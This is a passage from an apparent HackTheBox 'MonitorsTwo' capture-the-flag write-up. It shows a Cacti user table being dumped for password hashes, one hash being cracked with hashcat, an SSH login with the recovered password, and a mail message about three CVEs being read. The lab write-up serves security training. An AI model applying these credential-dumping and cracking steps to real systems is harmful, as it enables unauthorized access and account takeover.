+</span></span><span class="line"><span class="cl"><span class="nb">set</span> -ex
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">wait-for-it db:3306 -t <span class="m">300</span> -- <span class="nb">echo</span> <span class="s2">&#34;database is connected&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> ! <span class="k">$(</span>mysql --host<span class="o">=</span>db --user<span class="o">=</span>root --password<span class="o">=</span>root cacti -e <span class="s2">&#34;show tables&#34;</span><span class="k">)</span> <span class="o">=</span>~ <span class="s2">&#34;automation_devices&#34;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    mysql --host<span class="o">=</span>db --user<span class="o">=</span>root --password<span class="o">=</span>root cacti &lt; /var/www/html/cacti.sql
+</span></span><span class="line"><span class="cl">    mysql --host<span class="o">=</span>db --user<span class="o">=</span>root --password<span class="o">=</span>root cacti -e <span class="s2">&#34;UPDATE user_auth SET must_change_password=&#39;&#39; WHERE username = &#39;admin&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">    mysql --host<span class="o">=</span>db --user<span class="o">=</span>root --password<span class="o">=</span>root cacti -e <span class="s2">&#34;SET GLOBAL time_zone = &#39;UTC&#39;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">chown www-data:www-data -R /var/www/html
+</span></span><span class="line"><span class="cl"><span class="c1"># first arg is `-f` or `--some-option`</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">1</span><span class="p">#-</span><span class="si">}</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">set</span> -- apache2-foreground <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This script is attaching to the mysql database, and updating some settings. Let&rsquo;s see if we can attach to the database in the same fashion.</p>
+<h3 id="connecting-to-mysql-database">Connecting to mysql database
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@50bca5e748b0:/# mysql --host=db --user=root --password=root cacti
+</span></span><span class="line"><span class="cl">Reading table information for completion of table and column names
+</span></span><span class="line"><span class="cl">You can turn off this feature to get a quicker startup with -A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Welcome to the MariaDB monitor.  Commands end with ; or \g.
+</span></span><span class="line"><span class="cl">Your MySQL connection id is 46
+</span></span><span class="line"><span class="cl">Server version: 5.7.40 MySQL Community Server (GPL)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MySQL [cacti]&gt; show tables;
+</span></span><span class="line"><span class="cl">+-------------------------------------+
+</span></span><span class="line"><span class="cl">| Tables_in_cacti                     |
+</span></span><span class="line"><span class="cl">+-------------------------------------+
+</span></span><span class="line"><span class="cl">| aggregate_graph_templates           |
+</span></span><span class="line"><span class="cl">| aggregate_graph_templates_graph     |
+</span></span><span class="line"><span class="cl">| aggregate_graph_templates_item      |
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Within the database, there is an interesting table <code>user_auth</code>. For simplicity, I show only username and password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MySQL [cacti]&gt; select username, password from user_auth;
+</span></span><span class="line"><span class="cl">+----------+--------------------------------------------------------------+
+</span></span><span class="line"><span class="cl">| username | password                                                     |
+</span></span><span class="line"><span class="cl">+----------+--------------------------------------------------------------+
+</span></span><span class="line"><span class="cl">| admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
+</span></span><span class="line"><span class="cl">| guest    | 43e9a4ab75570f5b                                             |
+</span></span><span class="line"><span class="cl">| marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
+</span></span><span class="line"><span class="cl">+----------+--------------------------------------------------------------+
+</span></span><span class="line"><span class="cl">3 rows in set (0.001 sec)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In addition to a probably default admin and guest credential, we see a different user marcus.
+Submitting the hash to a rainbow table does not generate a hit.</p>
+<p><img src="/p/hackthebox-monitorstwo/Images/crackstation.png"
+	width="1017"
+	height="289"
+	srcset="/p/hackthebox-monitorstwo/Images/crackstation_hu6010595754530120559.png 480w, /p/hackthebox-monitorstwo/Images/crackstation_hu7454846950360914004.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="351"
+		data-flex-basis="844px"
+	
+></p>
+<p>Using hashcat, we can crack this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ hashcat -m 3200 &#39;$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C&#39; /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">hashcat (v6.2.5) starting
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
+</span></span><span class="line"><span class="cl">                                                          
+</span></span><span class="line"><span class="cl">Session..........: hashcat
+</span></span><span class="line"><span class="cl">Status...........: Cracked
+</span></span><span class="line"><span class="cl">Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+</span></span><span class="line"><span class="cl">Hash.Target......: $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70Jonsd...hFYK4C
+</span></span><span class="line"><span class="cl">Time.Started.....: Sun Apr  30 22:37:08 2023 (47 secs)
+</span></span><span class="line"><span class="cl">Time.Estimated...: Sun Apr  30 22:37:55 2023 (0 secs)
+</span></span><span class="line"><span class="cl">Kernel.Feature...: Pure Kernel
+</span></span><span class="line"><span class="cl">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 (100.00%)
+</span></span><span class="line"><span class="cl">Speed.#1.........:      183 H/s (7.49ms) @ Accel:16 Loops:8 Thr:11 Vec:1
+</span></span><span class="line"><span class="cl">Recovered........: 1/1 (100.00%) Digests
+</span></span><span class="line"><span class="cl">Progress.........: 8624/14344384 (0.06%)
+</span></span><span class="line"><span class="cl">Rejected.........: 0/8624 (0.00%)
+</span></span><span class="line"><span class="cl">Restore.Point....: 8448/14344384 (0.06%)
+</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
+</span></span><span class="line"><span class="cl">Candidate.Engine.: Device Generator
+</span></span><span class="line"><span class="cl">Candidates.#1....: allahuakbar -&gt; johnmark
+</span></span><span class="line"><span class="cl">Hardware.Mon.#1..: Temp: 65c Fan: 34% Util:100% Core:1316MHz Mem:3004MHz Bus:16
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="escaping-the-docker-container">Escaping the docker container
+</h3><p>We have a successful crack as <code>marcus:funkymonkey</code>. However, checking our shell&rsquo;s /etc/passwd shows that no user marcus currently exists:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">root</span><span class="err">@</span><span class="mi">50</span><span class="n">bca5e748b0</span><span class="p">:</span><span class="o">/</span><span class="c1"># cat /etc/passwd</span>
+</span></span><span class="line"><span class="cl"><span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sync</span>
+</span></span><span class="line"><span class="cl"><span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span> <span class="n">List</span> <span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span> <span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span> <span class="n">System</span> <span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">root</span><span class="err">@</span><span class="mi">50</span><span class="n">bca5e748b0</span><span class="p">:</span><span class="o">/</span><span class="c1"># </span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is because in this docker container, the contents are isolated from the host system. However with ssh open, we can use this entrypoint if marcus is a legitimate user on the main system:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ssh marcus@10.10.11.211 
+</span></span><span class="line"><span class="cl">The authenticity of host &#39;10.10.11.211 (10.10.11.211)&#39; can&#39;t be established.
+</span></span><span class="line"><span class="cl">ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
+</span></span><span class="line"><span class="cl">This key is not known by any other names.
+</span></span><span class="line"><span class="cl">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span><span class="line"><span class="cl">Warning: Permanently added &#39;10.10.11.211&#39; (ED25519) to the list of known hosts.
+</span></span><span class="line"><span class="cl">marcus@10.10.11.211&#39;s password: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">You have mail.
+</span></span><span class="line"><span class="cl">Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
+</span></span><span class="line"><span class="cl">marcus@monitorstwo:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation
+</h2><h3 id="finding-system-vulnerabilities-discussed-in-mail">Finding system vulnerabilities discussed in mail
+</h3><p>We successfully login, and note that we are told we have some mail. For HackTheBox systems, this is usually no coincidence, so let&rsquo;s check the mail contents first.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">marcus</span><span class="err">@</span><span class="n">monitorstwo</span><span class="p">:</span><span class="o">~$</span> <span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span><span class="o">/</span><span class="n">marcus</span> 
+</span></span><span class="line"><span class="cl"><span class="n">From</span><span class="p">:</span> <span class="n">administrator</span><span class="err">@</span><span class="n">monitorstwo</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">To</span><span class="p">:</span> <span class="n">all</span><span class="err">@</span><span class="n">monitorstwo</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">Subject</span><span class="p">:</span> <span class="n">Security</span> <span class="n">Bulletin</span> <span class="o">-</span> <span class="n">Three</span> <span class="n">Vulnerabilities</span> <span class="n">to</span> <span class="n">be</span> <span class="n">Aware</span> <span class="n">Of</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Dear</span> <span class="n">all</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">We</span> <span class="n">would</span> <span class="n">like</span> <span class="n">to</span> <span class="n">bring</span> <span class="n">to</span> <span class="n">your</span> <span class="n">attention</span> <span class="n">three</span> <span class="n">vulnerabilities</span> <span class="n">that</span> <span class="n">have</span> <span class="n">been</span> <span class="n">recently</span> <span class="n">discovered</span> <span class="ow">and</span> <span class="n">should</span> <span class="n">be</span> <span class="n">addressed</span> <span class="n">as</span> <span class="n">soon</span> <span class="n">as</span> <span class="n">possible</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">CVE</span><span class="o">-</span><span class="mi">2021</span><span class="o">-</span><span class="mi">33033</span><span class="p">:</span> <span class="n">This</span> <span class="n">vulnerability</span> <span class="n">affects</span> <span class="n">the</span> <span class="n">Linux</span> <span class="n">kernel</span> <span class="n">before</span> <span class="mf">5.11</span><span class="o">.</span><span class="mi">14</span> <span class="ow">and</span> <span class="n">is</span> <span class="n">related</span> <span class="n">to</span> <span class="n">the</span> <span class="n">CIPSO</span> <span class="ow">and</span> <span class="n">CALIPSO</span> <span class="n">refcounting</span> <span class="k">for</span> <span class="n">the</span> <span class="n">DOI</span> <span class="n">definitions</span><span class="o">.</span> <span class="n">Attackers</span> <span class="n">can</span> <span class="n">exploit</span> <span class="n">this</span> <span class="n">use</span><span class="o">-</span><span class="n">after</span><span class="o">-</span><span class="n">free</span> <span class="n">issue</span> <span class="n">to</span> <span class="n">write</span> <span class="n">arbitrary</span> <span class="n">values</span><span class="o">.</span> <span class="n">Please</span> <span class="n">update</span> <span class="n">your</span> <span class="n">kernel</span> <span class="n">to</span> <span class="n">version</span> <span class="mf">5.11</span><span class="o">.</span><span class="mi">14</span> <span class="ow">or</span> <span class="n">later</span> <span class="n">to</span> <span class="n">address</span> <span class="n">this</span> <span class="n">vulnerability</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">CVE</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mi">25706</span><span class="p">:</span> <span class="n">This</span> <span class="n">cross</span><span class="o">-</span><span class="n">site</span> <span class="n">scripting</span> <span class="p">(</span><span class="n">XSS</span><span class="p">)</span> <span class="n">vulnerability</span> <span class="n">affects</span> <span class="n">Cacti</span> <span class="mf">1.2</span><span class="o">.</span><span class="mi">13</span> <span class="ow">and</span> <span class="n">occurs</span> <span class="n">due</span> <span class="n">to</span> <span class="n">improper</span> <span class="n">escaping</span> <span class="n">of</span> <span class="n">error</span> <span class="n">messages</span> <span class="n">during</span> <span class="n">template</span> <span class="n">import</span> <span class="n">previews</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">xml_path</span> <span class="n">field</span><span class="o">.</span> <span class="n">This</span> <span class="n">could</span> <span class="n">allow</span> <span class="n">an</span> <span class="n">attacker</span> <span class="n">to</span> <span class="n">inject</span> <span class="n">malicious</span> <span class="n">code</span> <span class="n">into</span> <span class="n">the</span> <span class="n">webpage</span><span class="p">,</span> <span class="n">potentially</span> <span class="n">resulting</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">theft</span> <span class="n">of</span> <span class="n">sensitive</span> <span class="n">data</span> <span class="ow">or</span> <span class="n">session</span> <span class="n">hijacking</span><span class="o">.</span> <span class="n">Please</span> <span class="n">upgrade</span> <span class="n">to</span> <span class="n">Cacti</span> <span class="n">version</span> <span class="mf">1.2</span><span class="o">.</span><span class="mi">14</span> <span class="ow">or</span> <span class="n">later</span> <span class="n">to</span> <span class="n">address</span> <span class="n">this</span> <span class="n">vulnerability</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">CVE</span><span class="o">-</span><span class="mi">2021</span><span class="o">-</span><span class="mi">41091</span><span class="p">:</span> <span class="n">This</span> <span class="n">vulnerability</span> <span class="n">affects</span> <span class="n">Moby</span><span class="p">,</span> <span class="n">an</span> <span class="n">open</span><span class="o">-</span><span class="n">source</span> <span class="n">project</span> <span class="n">created</span> <span class="n">by</span> <span class="n">Docker</span> <span class="k">for</span> <span class="n">software</span> <span class="n">containerization</span><span class="o">.</span> <span class="n">Attackers</span> <span class="n">could</span> <span class="n">exploit</span> <span class="n">this</span> <span class="n">vulnerability</span> <span class="n">by</span> <span class="n">traversing</span> <span class="n">directory</span> <span class="n">contents</span> <span class="ow">and</span> <span class="n">executing</span> <span class="n">programs</span> <span class="n">on</span> <span class="n">the</span> <span class="n">data</span> <span class="n">directory</span> <span class="n">with</span> <span class="n">insufficiently</span> <span class="n">restricted</span> <span class="n">permissions</span><span class="o">.</span> <span class="n">The</span> <span class="n">bug</span> <span class="n">has</span> <span class="n">been</span> <span class="n">fixed</span> <span class="ow">in</span> <span class="n">Moby</span> <span class="p">(</span><span class="n">Docker</span> <span class="n">Engine</span><span class="p">)</span> <span class="n">version</span> <span class="mf">20.10</span><span class="o">.</span><span class="mi">9</span><span class="p">,</span> <span class="ow">and</span> <span class="n">users</span> <span class="n">should</span> <span class="n">update</span> <span class="n">to</span> <span class="n">this</span> <span class="n">version</span> <span class="n">as</span> <span class="n">soon</span> <span class="n">as</span> <span class="n">possible</span><span class="o">.</span> <span class="n">Please</span> <span class="n">note</span> <span class="n">that</span> <span class="n">running</span> <span class="n">containers</span> <span class="n">should</span> <span class="n">be</span> <span class="n">stopped</span> <span class="ow">and</span> <span class="n">restarted</span> <span class="k">for</span> <span class="n">the</span> <span class="n">permissions</span> <span class="n">to</span> <span class="n">be</span> <span class="n">fixed</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
